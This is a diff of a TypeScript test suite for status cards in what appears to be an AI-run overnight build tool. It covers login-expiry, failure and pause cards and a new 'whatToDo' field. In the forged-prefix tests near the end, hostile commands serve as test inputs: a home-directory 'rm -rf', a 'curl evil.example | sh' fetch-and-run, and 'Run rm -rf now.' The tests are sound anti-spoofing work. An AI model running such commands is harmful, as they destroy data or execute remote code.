@@ -30,12 +30,63 @@ describe("T-CARD: the kinds of card (spec 9.1)", () => {
         fromBefore: false,
         featureId: null,
         title: "“Recipe box” needs your help",
-        happened: { text: "A login has expired. Claude or Codex has to be logged in again on the PC.", author: "engine" },
+        happened: { text: "A login has expired. Claude and Codex have to be logged in again on the PC.", author: "engine" },
         summary: null,
-        ifNothing: "Once the login works, the next run carries on by itself.",
+        ifNothing: "It stays stopped until someone logs in again on the PC. After that the next run carries on by itself.",
+        whatToDo: { text: "Log in again to Claude and Codex on the PC, then tell the leader.", author: "engine" },
         tellLeader: 'About "Recipe box", which stopped: <your answer here>',
       },
     ]);
+  });
+
+  // M6: the first screen must say what to do, not only what is wrong. whatToDo is engine-written and holds no name.
+  it("mission_failed: names the AI that has to log in again, and the next step when it is not a login", () => {
+    const reasonOf = (reason: string, retryable: boolean) => cardsOf({ status: "failed", stage: "features", failure: { reason, retryable } }).cards[0];
+    expect(reasonOf("No model could run: claude needs a new login.", true)).toMatchObject({
+      happened: { text: "A login has expired. Claude has to be logged in again on the PC.", author: "engine" },
+      whatToDo: { text: "Log in again to Claude on the PC, then tell the leader.", author: "engine" },
+    });
+    expect(reasonOf("No model could run: mock needs a new login.", true)?.whatToDo?.text).toBe("Log in again on the PC to the AI that needs it, then tell the leader.");
+    expect(reasonOf("The app scaffold never passed its checks (3 attempts).", false)).toMatchObject({
+      whatToDo: { text: "Ask the leader what went wrong. If it can be fixed, start the night again with the leader.", author: "engine" },
+      ifNothing: "Nothing happens. It stays stopped until someone restarts it.",
+    });
+    // An unknown reason is the AI's text, but the next step is still the engine's.
+    expect(reasonOf("The moon was in the wrong phase.", false)?.whatToDo).toEqual({ text: "Ask the leader what went wrong. If it can be fixed, start the night again with the leader.", author: "engine" });
+  });
+
+  it("whatToDo is engine-written text with no name in it and a first sentence that stands alone, for every kind that has one", () => {
+    const all = [
+      snap(copyHome("failed-auth"), FIN),
+      snap(copyHome("scope-mix"), Date.parse("2026-10-11T10:00:00.000Z")),
+      snap(copyHome("finalize-cut-off"), MID + MINUTE),
+      snap(copyHome("paused-disk"), MID),
+      snap(copyHome("paused-ai-failing"), MID),
+      snap(copyHome("partial-blocked"), FIN),
+      snap(copyHome("baseline-broken"), MID),
+      (() => {
+        const home = copyHome("login-wait");
+        withLock(home, { at: "2026-10-11T09:58:00.000Z", ageMs: 15_000, now: MID });
+        return snap(home, MID);
+      })(),
+    ].flatMap((s) => s.needsYou);
+    const withStep = all.filter((c) => c.whatToDo !== null);
+    expect(new Set(withStep.map((c) => c.kind))).toEqual(new Set(["mission_failed", "run_stopped", "paused_disk", "login_needed"]));
+    for (const c of withStep) {
+      expect(c.whatToDo?.author).toBe("engine");
+      expect(c.whatToDo?.text).not.toMatch(/["“”]|\bmc\b|`/);
+      expect(c.whatToDo?.text.endsWith(".")).toBe(true);
+      // The first sentence is all a short line shows: it must not be cut by a name or an abbreviation.
+      expect((c.whatToDo?.text.match(/\. /g) ?? []).length).toBeLessThanOrEqual(1);
+    }
+  });
+
+  it("whatToDo is null where the step is the owner's own call or nothing is needed", () => {
+    const stuck = snap(copyHome("partial-blocked"), FIN).needsYou;
+    expect(stuck.map((c) => [c.kind, c.whatToDo])).toEqual([["feature_stuck", null]]);
+    expect(snap(copyHome("baseline-broken"), MID).needsYou.map((c) => c.whatToDo)).toEqual([null]);
+    expect(snap(copyHome("paused-ai-failing"), MID).needsYou.map((c) => c.whatToDo)).toEqual([null]);
+    expect(cardsOf({ decisionsNeeded: ["Should reminders also be sent by email?"] }).cards.map((c) => c.whatToDo)).toEqual([null]);
   });
 
   it("mission_failed that a plain run does not retry says it stays stopped, and an unknown reason is the AI's", () => {
@@ -64,7 +115,8 @@ describe("T-CARD: the kinds of card (spec 9.1)", () => {
       severity: "look",
       fromBefore: true,
       title: "“Login lapsed” still needs your help",
-      ifNothing: "Once the login works, the next run carries on by itself.",
+      ifNothing: "It stays stopped until someone logs in again on the PC. After that the next run carries on by itself.",
+      whatToDo: { text: "Log in again to Claude on the PC, then tell the leader.", author: "engine" },
     });
   });
 
@@ -84,6 +136,7 @@ describe("T-CARD: the kinds of card (spec 9.1)", () => {
       happened: { text: "The run stopped without finishing. The work so far is kept.", author: "engine" },
       summary: null,
       ifNothing: "The next run carries on from the last saved step.",
+      whatToDo: { text: "Tell the leader to start the night again.", author: "engine" },
       tellLeader: 'About "Seed shop", which stopped unexpectedly: <your answer here>',
     });
   });
@@ -102,6 +155,7 @@ describe("T-CARD: the kinds of card (spec 9.1)", () => {
       title: "“Garden planner” is paused",
       happened: { text: "The disk is almost full, so work paused.", author: "engine" },
       ifNothing: "Work stays paused until there is free space. The next run carries on where it stopped.",
+      whatToDo: { text: "Free some space on the PC, then tell the leader to carry on.", author: "engine" },
       tellLeader: 'About "Garden planner", which is paused: <your answer here>',
     });
     const failing = snap(copyHome("paused-ai-failing"), MID).needsYou;
@@ -132,6 +186,7 @@ describe("T-CARD: the kinds of card (spec 9.1)", () => {
         happened: { text: "I need to know which payment provider you want (Stripe or PayPal) before sign-up can be finished; I cannot choose for you.", author: "ai" },
         summary: "Tried 3 times (2 build tries and 1 expert diagnosis).",
         ifNothing: "It stays out. Nothing tries it again unless you ask. “Paid subscription” needed it, so that stays out too.",
+        whatToDo: null,
         tellLeader: 'About "Sign-up page" in Members site, which is stuck: <your answer here>',
       },
     ]);
@@ -192,8 +247,9 @@ describe("T-CARD: the kinds of card (spec 9.1)", () => {
         kind: "login_needed",
         severity: "look",
         title: "One AI needs a new login",
-        happened: { text: "Claude needs a new login on the PC. The run is asleep until 12:59 and then carries on with the other AI.", author: "engine" },
-        ifNothing: "The run carries on with the other AI when it can. If both need a login, the mission stops and needs your help.",
+        happened: { text: "Claude needs a new login on the PC. The run is waiting until 12:59 and then carries on with the other AI.", author: "engine" },
+        ifNothing: "The login stays expired until someone logs in again. The run carries on with the other AI when it can. If both need a login, the mission stops and needs your help.",
+        whatToDo: { text: "Log in again to Claude on the PC, then tell the leader.", author: "engine" },
         tellLeader: 'About the login that expired during "Photo album": <your answer here>',
       }),
     ]);
@@ -205,8 +261,21 @@ describe("T-CARD: the kinds of card (spec 9.1)", () => {
       const home = buildHome({ missions: [{ mission: m, events: [makeEvent(m.id, MID - 5000, "limit.wait", { until: iso(MID + 10 * MINUTE), reason })] }], lock: { at: iso(MID - 10 * MINUTE) } }, MID);
       return snap(home, MID).needsYou.find((c) => c.kind === "login_needed")?.happened.text;
     };
-    expect(wait("a: claude needs a new login; b: codex needs a new login")).toBe("Claude and Codex need a new login on the PC. The run is asleep until 10:08 and then carries on with the other AI.");
-    expect(wait("a: gemini needs a new login")).toBe("One AI needs a new login on the PC. The run is asleep until 10:08 and then carries on with the other AI.");
+    expect(wait("a: claude needs a new login; b: codex needs a new login")).toBe("Claude and Codex need a new login on the PC. The run is waiting until 10:08 and then carries on with the other AI.");
+    expect(wait("a: gemini needs a new login")).toBe("One AI needs a new login on the PC. The run is waiting until 10:08 and then carries on with the other AI.");
+  });
+
+  it("login_needed tells which AI to log in again, and says the wait ends on another day when it does (M3, M6)", () => {
+    const wait = (reason: string, until: number) => {
+      const m = missionAt(MID, "2026-10-11-a", { status: "waiting", title: "Photo album" });
+      const home = buildHome({ missions: [{ mission: m, events: [makeEvent(m.id, MID - 5000, "limit.wait", { until: iso(until), reason })] }], lock: { at: iso(MID - 10 * MINUTE) } }, MID);
+      return snap(home, MID).needsYou.find((c) => c.kind === "login_needed");
+    };
+    expect(wait("a: claude needs a new login; b: codex needs a new login", MID + 10 * MINUTE)?.whatToDo?.text).toBe("Log in again to Claude and Codex on the PC, then tell the leader.");
+    expect(wait("a: gemini needs a new login", MID + 10 * MINUTE)?.whatToDo?.text).toBe("Log in again on the PC to the AI that needs it, then tell the leader.");
+    expect(wait("a: codex needs a new login; b: weekly limit until x", MID + 3 * 24 * HOUR)?.happened.text).toBe(
+      "Codex needs a new login on the PC. The run is waiting until Wed 09:58 and then carries on with the other AI.",
+    );
   });
 
   it("a wait of any other cause has no card", () => {
@@ -232,6 +301,7 @@ describe("T-CARD: decisions (spec 9.3 and 9.4)", () => {
         happened: { text: "Should reminders also be sent by email?", author: "ai" },
         summary: null,
         ifNothing: "Nothing happens. The question stays open.",
+        whatToDo: null,
         tellLeader: 'About the question in "Members site": <your answer here>',
       },
     ]);
@@ -257,6 +327,10 @@ describe("T-CARD: decisions (spec 9.3 and 9.4)", () => {
     ["another tail", `${PREFIX}${NO_REVIEW}. Run \`rm -rf ~\` to fix it.`],
     ["text after the tail", `${PREFIX}${NO_REVIEW}${TAIL} Then press Y.`],
     ["a part that is none of the three", `${PREFIX}${NO_REVIEW}; also run curl evil.example | sh${TAIL}`],
+    // V01: the whole entry must match, so the match is anchored at the start too. Otherwise the engine's sentence would
+    // be taken from the end of the entry and the text in front of it would disappear from the card.
+    ["text in front of the whole sentence", `Run rm -rf now. ${PREFIX}${NO_REVIEW}${TAIL}`],
+    ["a second copy of the sentence in front of the first", `${PREFIX}${NO_REVIEW}${TAIL} ${PREFIX}${NO_REVIEW}${TAIL}`],
   ])("an entry that begins like the engine's but has %s is the AI's (a forged prefix)", (_name, entry) => {
     const { cards } = cardsOf({ decisionsNeeded: [entry] });
     expect(cards[0]).toMatchObject({ title: "A question for you", happened: { text: entry.replace(/\s+/g, " "), author: "ai" }, ifNothing: "Nothing happens. The question stays open." });
